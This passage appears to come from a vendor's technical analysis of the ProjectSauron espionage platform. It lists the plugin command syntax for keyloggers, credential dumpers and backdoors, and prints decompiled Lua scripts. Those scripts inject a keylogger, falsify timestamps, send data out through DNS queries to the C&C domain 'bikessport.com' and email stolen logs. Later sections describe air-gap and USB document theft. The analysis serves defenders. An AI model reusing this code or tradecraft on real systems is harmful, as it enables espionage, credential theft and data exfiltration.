-db<DATE> Only show files earlier than <DATE> Date is in YYYYMMDDHHMM -za<SIZE> Only shows files bigger than or equal to <SIZE> -zb<SIZE> Only shows files smaller than or equal to <SIZE> You can use K/M/G as in 20KFor any inquiries, contact intelreports@kaspersky.comPage 13 of 33The ProjectSauron APT. Technical analysisdroopemaildftimeget2grepAdditional blob containing one DLL file \u2013 downloader When activated, the library downloads a file using a hardcoded URL using a 2048-bit key. If the decrypted blob matches the format of a standard blob, it is then executed.Dump stored email accounts The plugin displays settings for applications that uses Microsoft Internet Account Manager. This includes Outlook and Outlook Express, but also an unknown number of third party applications.Display or copy file time [-E] [-c file] file Options: -E Exclude the PE header time stamp. -c Copy file time from the specified file to the target. This plugin is used to tailor each installed executable file to the environment, modifying the filesystem and PE format timestamps to be equal to the corresponding values of legitimate files, i.e. \u201cntdll.dll\u201d or \u201csvchost.exe\u201d. This prevents fast discovery of malicious files during forensic analysis.Get files using file api Usage: [options] <files > Options: -r Recurse subdirectories -a Abort on failure (file not found, etc)Search for pattern in files [options] <regexp> [file | @file] Indata types: -U Indata is UNICODE (default is auto-detect) -u Indata is ASCII -b Indata is binary Regexp interpretation: -i Ignore case distinctions Miscellaneous: -s Suppress error messages -v Select non-matching lines -I Ignore binary files Output control: -N <NUM> Read only NUM lines in each file -m <NUM> Stop after NUM matches -n Print line number with output lines -h Suppress the prefixing filename on output -L Only print FILE names containing no match -l Only print FILE names containing matches -c Only print a count of matching lines per FILEFor any inquiries, contact intelreports@kaspersky.comPage 14 of 33The ProjectSauron APT. Technical analysis-p Only print the match (or submatch if used) of matching lines Context control: -B <NUM> Print NUM lines of leading context -A <NUM> Print NUM lines of trailing context -C <NUM> Print NUM lines of output context With no FILE, or when FILE is -, read standard input. When FILE is @[file], read file NAMES from [file]. When FILE is @-, read file NAMES from standard input.Two-way C&C communication transportCheck for injection detecting Options: -v Enable verbose output This plugin detects active drivers of many security products. Contains string \u201ci bootleg\u201d as part of the version string. Uses a local privilege escalation exploit. (\u201ckern read\u201d)Inject a plugin into another process Blob-wrapped package of the \u201ckblog\u201d pluginKeyloggerKeylogger -p proc Inject using process name or pid. Default \"explorer.exe\". -c file Convert mode: Read log from file and convert to text. -t sec Maximum running time in seconds -v Verbose mode -? Displays this usage information.RSA-2048 key used by the plugin \u201cnpexfil\u201dKernel Gate Drops and executes vulnerable Outpost Sandbox driver (32 bit, v. 02.02.0597 from 2008) or avast! Virtualization driver (64 bit, v. 9.0.2006.159) to gain kernel mode execution and load own driver (knatt)Network packet filtering and modification driverDump LSA secretsCreate a directory on diskRenames a file or directoryilpsendinjchkinjectkb64, xkgateknatt.syslsadumpmkdirmoveFor any inquiries, contact intelreports@kaspersky.comPage 15 of 33The ProjectSauron APT. Technical analysismove move [options] [drive:][path]<source name> [drive:][path]<destination -O Overwrite existing file (not directory). Note! When source and destination is on different drives, move may fail. In such cases use copy and del.mytrampoline.blobShadow filesystem exfiltration toolnetnfonetxnpbd64npclient2, npexfilnsluDump network information -i Dump interface information. -r Dump routing table. -a Dump ARP cache. -c Dump active network connections. -n Dump DNS cache. -A Dump all information.Displays open ports [-u] [-t] [-f] Options: -u Display open UDP ports. -t Display open TCP ports. -f Display full path to application (default: only show filename) -I Ignore rootkit alert. Default is both TCP and UDP ports. Blob containing a \u201cNullSessionPipes backdoor\u201d and its configuration Tool for exfiltrating data to a remote serverMini DNS name/address lookup [options] <address/name> Options: -s <name> Send the query to the given server. -t <type> Query type (default is to detect, either A or PTR). -T List supported query type. -c Force use of TCP for the query. -r Disallow recursive queries. -n Disallow use of NetBT for resolution. -l Use local cache only. -b Bypass any locally cached names. Use - instead of <address/name> to read addresses/names from stdin. This plugin may be chained with the \u201cdext\u201d plugin to implement a DNS exfiltration channel.onpusher.blob\u201cOnline Push v2\u201dFor any inquiries, contact intelreports@kaspersky.comPage 16 of 33The ProjectSauron APT. Technical analysisBlob containing the plugin \u201cnpclient2\u201d, controlling script and other dependencies for data exfiltration. The script looks for the data collected with the \u201cmytrampoline\u201d plugin from the shadow filesystem and pushes it to a remote storage (\u201cvault\u201d).Ping or traceroute a remote host -r Set mode to Traceroute (default: ICMP ping) -a Resolve addresses to hostnames -d delay Delay in milliseconds between pings (default: 1000 ms) -w timeout Timeout in milliseconds for each reply (default: 4000 ms) -f Set don't fragment flag (to check MTU) -i ttl Specify Time To Live value (default: 128) -l size Send buffer size (default: 32 bytes) -n count Number of echo requests to send (default: 1) -t Ping the specified host until stopped -u Only show IP-number of hosts that reply -s Only show IP-number of hosts that does not replyTerminate process(es) pkill pkill [-a] <pid|name>Print process list plist plist [mode] [options] Modes: (default is to show \"visible\" processes) -p {pid} Find process using PID -x Search for hidden processes -s {sid} Filter process using Session ID Options -a All details -b Use bare format (less formatting/spaces) -l All details except modules list -n {string} Search substring in process name and command-line -f {string} Search substring in process filename (full-path) -S Show Session ID columnDump protected storage -p <pid> Specify process to inject into (default is winlogon.exe). -l Do not load unloaded registry hives.Put files from file api Usage: [options] <source> [dest]Return the list of currently active processespingpkillplistpstorediput2pviewFor any inquiries, contact intelreports@kaspersky.comPage 17 of 33The ProjectSauron APT. Technical analysisrbswapregeditsamdumpscSchedule/List/Cancel pending file moves [-o] {source} [destination] Options: h - This help l - List files scheduled for moving d - Cancel the specified sheduled move o - Overwrite existing file If no destination is specified the source file will be deleted at the next reboot (instead of moved).Command line registry editor Usage: [options] [key1] [key2] Options: -i Import settings from stdin Note that the input must be on .reg format! -a Verbose display of values (human readable). -r Display on the .reg format. -s Traverse subdirectories as well. -l Load all unloaded user registry hives. [key] If key(s) are specified those will be displayed, otherwise a regedit \"shell\" is started.Dump the SAM database -n Do not include password history.Service controller [-s server] <command> [command specific args] Global options: -s Specify server name (default localhost) Commands: list List services. query Dump information about a service. start Start a service. stop Stop a service. pause Pause a service. continue Make a paused service resume execution. create Create a new service. config Change configuration for a service. delete Delete a service. desc Change the description of a service. To get help for a specific command use: %s {command} -hsinfoSystem information sinfo Usage: sinfo [-a]For any inquiries, contact intelreports@kaspersky.comPage 18 of 33The ProjectSauron APT. Technical analysisskipslsmtpsend-a Show volume information for all drives (removable, network etc). Warning, use this option with care since it causes cdrom-spinup, little network traffic and floppy-noise Filter the input lines from stdout and print only those that contain (or do not contain, depending on the command line switches) the particular substringPort scanner with TCP/UDP/ICMP support [-tu <n>[,<n>-<n>]] IP[,IP-IP] (use a single '-' character to read ip's from stdin) -? - Shows this help text -b - Get port banners -c - Timeout for TCP and UDP attempts (ms). Default is 4000 -d - Delay between host scans (ms). Default is 0 -D - Delay between port scans (ms). Default is 0 -g - Bind to given local port -h - Hide results for systems with no open ports -i - Just list responding hosts (IP addresses only) -j - Don't output \"----- \" separator between IPs -m - Bind to given local interface IP -M - When pinging, use Windows builtin lib (icmp.dll) (default on Vista) -n - No port scanning - only pinging -p - Do not ping hosts before scanning -P - Print partial results -q - Timeout for pings (ms). Default is 2000 -r - Resolve IP addresses to hostnames -t - TCP port(s) to scan (a comma separated list of ports/ranges) -T - Use internal list of TCP ports -u - UDP port(s) to scan (a comma separated list of ports/ranges) -U - Use internal list of UDP ports -v - Verbose mode -V - Very Verbose mode -z - Randomize IP and port scan order -Z - Randomize source port instead of letting the OS select it. The randomization range is set to 2k -> 32k Scan TCP ports 80, 100, 101 200 and 443 on all IP banners from those ports and hiding hosts that had no open ports.SMTP client [-v] [-p <port>] [-w <timeout>] [-f <nbr>] [-H <host>] [-A <header>] <server> <from> <to> [<body>] Options:For any inquiries, contact intelreports@kaspersky.comPage 19 of 33The ProjectSauron APT. Technical analysis-v Enable verbose output. Use multiple times for even more verbose output. -p Connect to server on <port>. Default port is 25. -w Number of ms to wait before aborting if server doesn't respond. Default: 10 minutes. -f Try to send HELO:s multiple times, if the server rejects the previous HELO:s. Default is to fail if the first is rejected. -H Claim to be the host <host> in the HELO handshake. Default: localhost. -A Append <header> as a header-row in the mail. Use multiple times if needed. <server> The dns-name or ip-address of the smtp-server. <from> The senders e-mail address. <to> The recipients e-mail address. <body> The file containing the actual e-mail. This file is read using the file-api. No processing is done on the data, so please make sure the line endings are the propper CRLF etc. If this argument is omitted, the e-mail is read from stdin. In this case, the body is assumed to be utf-16 and is converted to utf-8.Change user context Options: [-u user] [-p password] [-x hash] [-i] [-t process] -t Take user context from process (name or pid) -i Specify interactive logon (default network) -x Specify hash for logon (NT-hash of password) -p Specify password for logon -u Specify user name for logonElevate privileges to a system account and inject a blob in a running system process.Elevate privileges to execute in the SYSTEM context Pre-packaged core platform with a script ready for installation in a target systemGet OS version information, computer name, processor architecture, machine role and OS edition (domain controller, workstation, compute cluster, datacenter, terminal server, storage server, small business, home server, etc.) Pre-packaged core platform with a script tasked for removing all the traces of the malicious components in the systemDump user list -f <pattern> Display only users where the name matches <pattern>. -s <server> Display users on <server>. Default is localhost.susudetachsuxsymnet32unameuninstdllusersFor any inquiries, contact intelreports@kaspersky.comPage 20 of 33The ProjectSauron APT. Technical analysisw3getwdogiDownload and upload files using HTTP(S) -v Be verbose. -s Print downloaded data to stdout. Can be used in combination with -f, to save a copy as well. If this flag is used, everything else is sent to stderr. -f <file> Specify local file. -r <file> Specify file to post to server. -c <chunk size> Post argument to server. -C Allow w3get to send and receive cookies. (Default disable) -R Allow w3get to follow http redirections. (Default disable) -o Overwrite existing file. -k <key>=<value> Specify a key=value pair to post to server. -p <argument> Post argument to server. -d Direct connection to server, ignores proxy settings. -g <ip:port> Use this proxy instead of user's proxy settings.Basic backdoor <options> [hostname port] Options: -l listen mode (default connect mode) -p <port> local source port for listen/connect -s <ip> local source ip for listen/connect -d <delay> delay a number of seconds before starting -I <process> run injected in process (pid or name) -x <handle> use socket identified by handle -y <process> process to use socket from (default own) -f force injection even if protection detected -u port reuse: allow listen on a busy port -a <ip> accept connections from ip address only -A <port> accept connections from source port only -t <seconds> accept timeout -j listen/connect from injected process The network communication component of the plugin is similar to the one implemented in the NullSessionPipes backdoor. However, the symmetric encryption algorithm used is RC6 combined with RSA for key exchange. The response from the server is checked against an 8-byte magic string. The payload from the remote peer is expected to be a JCalg1-compressed DLL. It is loaded and started by the plugin. This plugin is found in many configurations of the core platforms, in many cases this is the only plugin that is activated by the script. The hostname used is usually a local IP address (i.e. a domain controller in the compromised network).For any inquiries, contact intelreports@kaspersky.comPage 21 of 33The ProjectSauron APT. Technical analysisweddllwfwwhoamiwinstPassive sniffer backdoor ready for installation in the target systemWindows FireWall controller {command|-h} [options] -h - Show this help text status - Show Firewall Status enable - Enable Firewall disable - Disable Firewall appadd {FullPath} {FriendlyName} {IPMask} - Add an application appdel {FullPath} - Remove an application portadd {PortNr} {TCP|UDP} {FriendlyName} {IPMask} - Add a port portdel {PortNr} {TCP|UDP} - Remove a port Example 1: Add Messenger accepting connections from any ip address appadd \"%%ProgramFiles%%\\Messenger\\msmsgs.exe\" \"Windows Messenger\" \"*\" -a Display all available information. -n Do not resolve SIDs to names.Wedding DLL installer (DLL installer) Usage: launch [-f] [-l] [-p process] <dll> halt <dll | -e event> status <dll | -e event> install [-c file] <dll> uninstall [-n] <dll> install - Install the given DLL uninstall - Uninstall the given DLL launch - Inject and start the given DLL halt - Stop the given DLL status - Print some status for installed DLL info - Show info about DLL Options: -p <process> Process to inject into (name/pid, default depends on DLL) -e Specify event name (default read from dll) -f Launch even if DLL not installed -l Start in loaded mode (default injected mode) -c Copy timestamps from given file -n Uninstall without haltingFor any inquiries, contact intelreports@kaspersky.comPage 22 of 33The ProjectSauron APT. Technical analysisAlthough the authors called it \u201cwedding DLL installer\u201d and \u201cweddll\u201d is the name of the passive backdoor, they also used this plugin to install other malicious DLLs in the target systems.Secure Delete wipe Usage: wipe [-f] [-s] [-q] [-d] <file or directory> -s Recurse subdirectories -d Match directories as well as files (for wildcard) -f Force wiping of read-only files -q Do not ask for confirmation on multiple wipe To read a list of files from stdin, use - as file name. Encrypted data. The size and references in the Lua script indicate that it is most likely encrypted with RC6 using a 64-bit key, and the key is stored on the C&C server that activates the passive sniffer backdoor. Pipe and internet backdoor wrapped in an encryption layerwipewtcdllzeta2dllExamples of LUA scripts embedded in the Core platformThe LUA scripts presented were produced by the LuaDec decompiler modified to support the modifications of the LUA interpreter that is used in the platform.Minimal configuration, just launches the \u201cwdogi\u201d plugin to receive the actual payload from the nearest Shield\u201d process isn\u2019t found, and then sets its file creation time equal to notepad.exe file:pview = w.exec2str(\"pview\") if string.find(pview, \"mcshield.exe\") == nil then w.exec2str(\"winst install symnet32.dll\") w.exec2str(\"ftime -c %WINDIR%\\\\notepad.exe %windir%\\\\system32\\\\symnet32.dll\") endAnother small script, removes traces from the location where it supposedly was dropped, then waits for an incoming connection with a bigger payload or connect directly to the peer by the IP address that is contained in the nearby files:get_path = function() local t = w.exec2str(\"regedit -a \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\VirtualEncryptedNetwork\\\\Components\\\" |grep - i [snip] \") local p = string.match(t, \"= \\\"([^\\\"]+)\\\"\") if p then p = p \"\\\\\" elseFor any inquiries, contact intelreports@kaspersky.comPage 23 of 33The ProjectSauron APT. Technical analysisp = \"\" cleanup = function(l_2_0) w.exec2str(\"move \\\"\" l_2_0 \"FakeVirtualEncryptedNetwork.dll\\\" \\\"\" l_2_0 \"0004.bak\\\"\") w.exec2str(\"move \\\"\" l_2_0 \"FakeVirtualEncryptedNetwork.exe\\\" \\\"\" l_2_0 \"0005.bak\\\"\") w.exec2str(\"rbswap \\\"\" l_2_0 \"0004.bak\\\"\") w.exec2str(\"rbswap \\\"\" l_2_0 \"0005.bak\\\"\") w.exec2str(\"del \\\"\" l_2_0 \"0004.bak\\\"\") w.exec2str(\"del \\\"\" l_2_0 \"0005.bak\\\"\") w.exec2str(\"del \\\"\" l_2_0 \"FakeVirtualEncryptedNetwork.cfg\\\"\") exec = function(l_3_0) local c, l = nil, nil local d = w.exec2str(\"basex -b 16 < \\\"\" l_3_0 \"FakeVirtualEncryptedNetwork.cfg\\\"\") w.exec2str(\"del \\\"\" l_3_0 \"FakeVirtualEncryptedNetwork.cfg\\\"\") if string.len(d) >= 12 then local t = string.sub(d, 1, 8) local r = w.exec2str(\"cat \\\"\" l_3_0 \"settings.cfg\\\" | grep -i \" t) local t = string.gsub(string.sub(r, 11, -1), \"%c\", \"\") local t = tonumber(string.sub(d, 9, 12), 16) c = \"wdogi -f \" t \" \" t w.exec2str(c) w.exec2str(c) end if string.len(d) >= 16 then local l = tonumber(string.sub(d, 13, 16), 16) w.exec2str(\"wdogi -t 1200 -l -p \" l) else w.exec2str(\"wdogi -t 1200 -l -p 5010\") local p = get_path() cleanup(p) exec(p)Next, one script generates a new filename for collected keystrokes and injects keylogger module into the explorer.exe process:KBLOG_ROTATE_SECS = 10800 tmp_dir = os.getenv(\"WINDIR\") \"\\\\temp\\\\\" \"mISfx1q2Ef/QJPO4gi6DMKD5lxeQ380knDrULcZyTF5vFNWbUvT23PX9LrIdntHlkWAwjQQlfMXTogHW7fNklq/IsIk1dZljc9/J3A8gS dD9f1hdLaiF3Qe8QPSiu/yHNmE3o0nkt0iyudRVMQKL4KtoV0TRy2o+XuN0+TYfnLWPkR11qk9pNAG1S9+qqhcD4eNWBkiwBJH1Zi HaJDBZ/KJSOTLoXqoFsS2f0Z+EeTe5+GCjKYDH7f2gkMsPA1z5LyP/PWnjxRoIubEtOfpMR7oDjKOcd9Y97XehAkmqnVW4r4Gbsk0hk jjRFZ/I7lO2eK8eE2mcSW+TRBMJBPEJEw==\"For any inquiries, contact intelreports@kaspersky.comPage 24 of 33The ProjectSauron APT. Technical analysiscreate_log = function(l_1_0, l_1_1, l_1_2, l_1_3) w.sleep(1000) t4 = w.randstr(\"1\", 5) f = l_1_0 t1 t2 t3 t4 \".da\" res = w.start_log(\"file\", f, \"new\", true, l_1_1, l_1_2, l_1_3) log_rotate = function(l_2_0, l_2_1) res = w.start_log(\"null\") new_filename = l_2_0 l_2_1 cmd = string.format(\"move \\\"%s\\\" \\\"%s\\\"\", l_2_0, new_filename) w.exec(cmd) w.printf(\"Entering main\\n\") w.set(\"flush-time\", \"10s\") w.set(\"inj\", true) w.set(\"name\", \"kblog - waiting for file and injection\") alist = w.exec2str(\"dir /a-d /b /F \" tmp_dir \"bka*.da\") if string.find(alist, \"bka\") then sep = \"\\r\\n\" for s in string.gmatch(alist, \"([^\" sep \"]+)\") do w.exec2str(\"move \" s \" \" s \"t\") w.printf(\"Sleep before pview\\n\") w.sleep(5000) proc = w.exec2str(\"pview\") until string.find(string.lower(proc), \"explorer\") ~= nil filename = create_log(tmp_dir, SAURON_KBLOG_KEY, 0, 0) w.set(\"name\", \"kblog running - file \" filename) w.exec(\"inject explorer.exe kblog -v -t \" KBLOG_ROTATE_SECS) w.stop_log() w.sleep(2000) log_rotate(filename, \"t\") w.exec(cmd) main()For any inquiries, contact intelreports@kaspersky.comPage 25 of 33The ProjectSauron APT. Technical analysisThis is a mid-sized script that collects basic system information and sends it in an e-mail. There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to seemingly random subdomain names of the \u201clog\u201d C&C domain (\u201cbikessport.com\u201d), and each relayPort = \"443\" mailto = \"xxx.xxx.xxx@gmail.com\" mailSubject = \"Regarding your offer\" mailBody = \"This is to inform you that I decline your offer. See attachment.\\n Best Regards xxxxx\" domain = \"bikessport.com\" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) buffer = \"\" id1 = string.upper(string.format(\"%04x%04x\", math.random(4369, 65535), math.random(0, 65535))) id2 = string.format(\"%07u\", math.random(0, 9999999)) boundary = string.format(\"--------------%06u%06u%06u%06u\", math.random(0, 9999), math.random(0, 9999), math.random(0, 9999), math.random(0, 9999)) delimiter = \"\\r\\n\" endOfRow = \"\\r\\n\" startBoundary = string.format(\"--%s\", boundary) endBoundary = string.format(\"%s%s--%s\", endOfRow, startBoundary, endOfRow) buffer = string.format(\"%sMessage-ID: <%s.%s@localhost.localdomain>%s\", buffer, id1, id2, endOfRow) buffer = string.format(\"%sFrom: <%s>%s\", buffer, l_1_1, endOfRow) buffer = string.format(\"%sMIME-Version: 1.0%s\", buffer, endOfRow) buffer = string.format(\"%sTo: %s%s\", buffer, l_1_0, endOfRow) buffer = string.format(\"%sSubject: %s%s\", buffer, l_1_2, endOfRow) buffer = string.format(\"%sContent-Type: multipart/mixed;%s boundary=\\\"%s\\\"%s\", buffer, endOfRow, boundary, endOfRow) buffer = string.format(\"%s%s\", buffer, endOfRow) buffer = string.format(\"%sThis is a multi-part message in MIME format.%s%s%s\", buffer, endOfRow, startBoundary, endOfRow) buffer = string.format(\"%sContent-Type: text/plain; charset=ISO-8859-1; format=flowed%s\", buffer, endOfRow) buffer = string.format(\"%sContent-Transfer-Encoding: 7bit%s%s\", buffer, endOfRow, endOfRow) buffer = string.format(\"%s%s%s\", buffer, l_1_3, endOfRow) buffer = string.format(\"%s%s%s%s\", buffer, endOfRow, startBoundary, endOfRow) buffer = string.format(\"%sContent-Type: application/x-msdownload;\\r\\n name=\\\"data.bin\\\"%s\", buffer, endOfRow) buffer = string.format(\"%sContent-Transfer-Encoding: base64%s\", buffer, endOfRow) buffer = string.format(\"%sContent-Disposition: attachment;\\r\\n filename=\\\"data.bin\\\"%s%s\", buffer, endOfRow, endOfRow) strLen = string.len(l_1_4) if index < strLen then istart = index index = index + 72 iend = index - 1For any inquiries, contact intelreports@kaspersky.comPage 26 of 33The ProjectSauron APT. Technical analysisif strLen < iend then buffer = string.format(\"%s%s%s\", buffer, string.sub(l_1_4, istart, iend), endOfRow) else buffer = string.format(\"%s%s\", buffer, endBoundary) w.exec(\"sinfo\") execStr = string.format(\"sinfo | basex -b 32url | dext -l 30 a.\" domain \" | nslu -\") res = w.exec2str(execStr) w.exec(\"netnfo -A\") execStr = string.format(\"netnfo -irc | basex -b 32url | dext -l 30 c.\" domain \" | nslu -\") res = w.exec2str(execStr) w.exec2str(\"su -t explorer.exe\") w.exec(\"regedit -a \\\"\\\\HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\"\") execStr = string.format(\"regedit -a \\\"\\\\HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" | basex -b 32url | dext -l 30 d.\" domain \" | nslu -\") res = w.exec2str(execStr) math.randomseed(os.time()) res = w.start_log(\"mem\", nil, nil) if res then s = w.exec2str(\"injchk\") if string.find(s, \"Not detected.\") then w.set(\"inj\", true) sux = w.exec2str(\"sux\") if string.find(sux, \"Success\") then w.exec(\"detach start blob lsass.exe\") execStr = string.format(\"nslu agc5221.\" domain) w.exec2str(execStr) else w.exec(\"sudetach start blob\") execStr = string.format(\"nslu agc9221.\" domain) w.exec2str(execStr) execStr = string.format(\"nslu agc3221.\" domain) w.exec2str(execStr) execStr = string.format(\"wipe FakeVirtualEncryptedNetwork.cfg\") w.exec(execStr) execStr = string.format(\"rbswap FakeVirtualEncryptedNetwork.EXE\") w.exec(execStr)For any inquiries, contact intelreports@kaspersky.comPage 27 of 33The ProjectSauron APT. Technical analysissres = systemcheck() w.exec(\"plist\") w.exec(\"wfw status\") w.exec(\"dinst\") regStr = w.exec2str(\"cat VirtualEncryptedNetwork.ini|grep -i \\\"pop|smtp\") for k,v in string.gmatch(regStr, \"(%w+)=([%w,%. ]*)\") do if string.lower(k) == \"smtpserver\" then if string.lower(k) == \"smtpport\" then w.printf(\"Server %s port %s\\n\", smtpserver, smtpport) w.debugf(\"Server %s port %s\\n\", smtpserver, smtpport) end dllNameUninst = \"mfc64d.dll\" windir = os.getenv(\"WINDIR\") w.exec(string.format(\"put2 uninstdll \\\"%s\\\\SYSTEM32\\\\%s\\\"\", windir, dllNameUninst)) w.exec(\"winst install \" dllNameUninst) w.exec(string.format(\"ftime -c \\\"%s\\\\SYSTEM32\\\\ntdll.dll\\\" \\\"%s\\\\SYSTEM32\\\\%s\\\"\", windir, windir, dllNameUninst)) w.exec(\"winst launch \" dllNameUninst) execStr = string.format(\"nslu ahc3221.\" domain) w.exec2str(execStr) w.exec(\"w3get -s url\") execStr = string.format(\"nslu ahc3421.\" domain) w.exec2str(execStr) w.exec(\"wdogi -f -j -I lsass.exe \" relayServer \" \" relayPort) execStr = string.format(\"nslu ahc3422.\" domain) w.exec2str(execStr) w.exec(\"dir /s /b ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key VirtualEncryptedNetwork.ini [snip] \") w.exec(\"dir /s /b ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key VirtualEncryptedNetwork.ini [snip] | get2 -\") w.stop_log() log = w.get_mem_log() slask = mail(mailto, mailto, mailSubject, mailBody, log) slask2 = w.exec2str(\"smtpsend \" externalmail \" \" mailto \" \" mailto, slask) w.debugf(slask2) slask2 = w.exec2str(\"smtpsend \" smtpserver \" \" mailto \" \" mailto, slask) w.debugf(slask2)Shadow filesystem exfiltration tool (\u201cMyTrampoline\u201d)MD5SizeFormatBitsLinker5DDD5294655E9EB3B9B2071DC2E503B127136DLL3211.0The module is designed for hidden data transfer between air-gapped and internet-connected networks.For any inquiries, contact intelreports@kaspersky.comPage 28 of 33The ProjectSauron APT. Technical analysisIt operates within one hardcoded directory, \u201cc:\\System Volume Information\\{774476DF-C00F-4e3a-BF4A- 6D8618CFA532}\\\u201dIt reads all files from the subdirectory \u201c07\u201d, tries to decrypt each file with RSA2048+AES. If the decrypted data matches the magic signature and the format of the default blob then it is started.The module creates an invisible window with class name by mask \"DMWndClassX%d\", where \u201c%d\u201d is a number starting for the message \u201cWM_DEVICECHANGE\u201d with parameter \u201cDBT_DEVICEARRIBAL\u201d indicating that a new disk volume appeared.from 7 and waitsFor every new volume, it retrieves the partition layout and tries to read the first 512 bytes located right after the first disk partition that was recognized by the OS. If the data starts with magic four bytes FF 09 12 34 then it is treated as a special file system (\u201cshadow file system\u201d).The shadow file system is separated in two \u201cpartitions\u201d: the first one is treated as a write-only partition for storing files collected from the local system; the files from the second partition are extracted, copied to the local storage and removed from their source location.The module reads all files from its local subdirectories \u201c00\u201d and \u201c04\u201d, copies them to the shadow file system and deletes their local copies.The files are renamed by prepending a string that is selected based on their location:\uf0b7 00/* \u2192 p_* \uf0b7 04/* \u2192 z_*All the files located in the shadow filesystem's second partition are enumerated, extracted from the storage and \u201cdeleted\u201d from the shadow FS. Each file's name is matched against a list of prefixes and if the prefix is known then the file is written to the local storage.The destination directory is selected based on the filename prefix:\uf0b7 p_* \u2192 06/* \uf0b7 b_* \u2192 01/*There is a known configuration of the core platform that specifically looks for files in the directories populated by the \u201cmytrampoline\u201d module and pushes these files to a remote repository, providing a communication channel for airgapped computers.Document stealing package \u201cBUS Manager\u201dThis optional package may be installed along with one of the Core modules, designed for collecting documents from any plugged USB sticks.Usually it has its own bootstrapper library for activation on the target system but is linked with the rest of the platform by data flow: the data collected by the package is just stored on disk and one or several LUA scripts of the Core packages extract the data and push it to a C&C server or to an intermediate remote repository.BUS manager stage 1 : bootstrap libraryFor any inquiries, contact intelreports@kaspersky.comPage 29 of 33The ProjectSauron APT. Technical analysisSamples:MD5SizeFormat BitsLinkerCompilation from a hardcoded Information\\_restore{ED650925-A32C-4E9C-8A73- 8E6F0509309A}\\RP0\\A0000002.dll\u201d, to decrypt it with RC5 and decompress with inflate. If the resulting blob contains a valid PE image of the \u201cmain module\u201d it is activated.location \u201cc:\\System VolumetraceDebug Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A}\\RP0\\change.log\u201d.is writtenencryptedlocatedfiletothelogat\u201cc:\\System VolumeBUS manager stage 2 : main module Samples:MD5SizeFormat BitsLinkerCompilation The DLL is named \u201cbusmain.dll\u201d in the export directory and provides two exported functions:84879 DLL9.0642012.01.04 11:27:53\uf0b7 BmnVersion @1 \uf0b7 Run @2The function \u201cBmnVersion\u201d returns a version string: \u201cmain module 1.10 (build 3)\u201d.The configuration of the module is read from an encrypted file at the location: \u201cc:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A}\\RP0\\A0000001.ini\u201dBUS CONFIG CommonFor any inquiries, contact intelreports@kaspersky.comPage 30 of 33The ProjectSauron APT. Technical analysisMaxLogSize1048576 rpt;*.conf;*.cfg;*.pk2;*.nct;*.key;*.psw*.txt;*.doc;*.docx;*.ppt;*.pptx;*.xls;*.xlsx;*.vsd;*.wab;*.pdf;*.dst;*.ppk;*.rsa;*.rar;*.one;*.rtf;~WPL*.tmp;*.FTS;*.ResourceUsageMaxProcTime 240DirFormat\\%s-%s.dirExample of a configuration file, A0000001.ini, decryptedWhen called by the \u201cRun\u201d function it looks for the files \u201cc:\\System Volume Information\\_restore{ED650925- A32C-4E9C-8A73-8E6F0509309A}\\RP0\\A???????.dll\u201d except its own, loads, decrypts, and decompresses them and tries to load each one as a plugin. The plugins are expected to be valid DLL files exporting a function \u201cBplVersion\u201d and returning a correct version number that should be \u201c2\u201d. Valid plugin libraries are activated by calling their functions exported by name \u201cBplInit\u201d.The module creates a window of class \u201cMessage\u201d and registers it for receiving device notifications each time a disk volume device changes state. Information about each change in volumes' state is written to the log file \u201cc:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A}\\RP0\\change.log\u201d Log files are rotated by renaming older ones to \u201cchange.log.1\u201d, \u201cchange.log.2\u201d, etc.Information about the volumes is then passed to the plugins to determine if they contain information of interest that should be collected. At the moment only one plugin is known, the \u201ccollect module 1.10 (build 3)\u201d.2016.02.29 09:34:04 Starting log (computer: \"computername\" serial: 1245:1337 timezone: UTC+3h). 2016.02.29 09:34:04 Loaded plugin A0000003.dll (collect module 1.10 (build 3)). 2016.02.29 09:34:04 Waiting 300 seconds. 2016.02.29 09:39:09 Starting.For any inquiries, contact intelreports@kaspersky.comPage 31 of 33The ProjectSauron APT. Technical analysis2016.02.29 09:39:09 Skipping CD-ROM [snip] ASUS DRW-12B3EE ATA Device. 2016.02.29 09:39:09 Skipping volume on [snip] WDC WD10EALX-071BA1 ATA Device: not USB 2016.02.29 09:39:09 Skipping volume on [snip] WDC WD10EALX-071BA1 ATA Device: not USB 2016.02.29 09:39:09 Skipping volume on [snip] WDC WD10EALX-071BA1 ATA Device: not USB 2016.02.29 14:36:31 Mounted volume #1: Volume serial: 9995:111B Volume label: Transcend Volume FS: FAT32 Volume size: 7809829816 Volume free: 6624871400 Device name: [snip] JetFlash Transcend 8GB USB Device Device type: DISK&VEN_JETFLASH&PROD_TRANSCEND_8GB&REV_8.07 Device serial: EEAABB13 2016.02.29 14:36:31 Starting processing for volume #1. 2016.02.29 14:36:31 Starting directory for volume 9995:111B. 2016.02.29 14:36:31 Ending directory for volume 9995:111B. 2016.02.29 14:36:31 Starting collection for volume 9995:111B. 2016.02.29 14:36:33 Copied \\9995_111B\\document.pdf. 2016.02.29 14:36:34 Volume #1 mount. 2016.02.29 14:36:34 Copied \\9995_111B\\important_document.doc. 2016.02.29 14:36:35 Copied \\9995_111B\\secret_data_on_usb_drive.docx. 2016.02.29 14:36:36 Ending collection for volume 9995:111B 115 files, 93 matching, 2 collected.Example of a log file, \u201cchange.log\u201d, decrypted, anonymizedCollected files are encrypted using RC5 and written to the directory \u201cc:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A}\\RP1\\\u201d. The contents of the file are prepended with a header that contains the original name of the file.BUS manager stage 3 : collect module match the masks specified in the configuration file. Such files are \u201ccollected\u201d by storing them in the Bus manager storage directory.Network snifferMD5SizeFormat BitsLinker Compilation timestamp951EBE1EE17F61CD2398D8BC0E00B099180224 DLL327.102009.03.08 11:31:35For any inquiries, contact intelreports@kaspersky.comPage 32 of 33The ProjectSauron APT. Technical analysisThis DLL is a standalone module 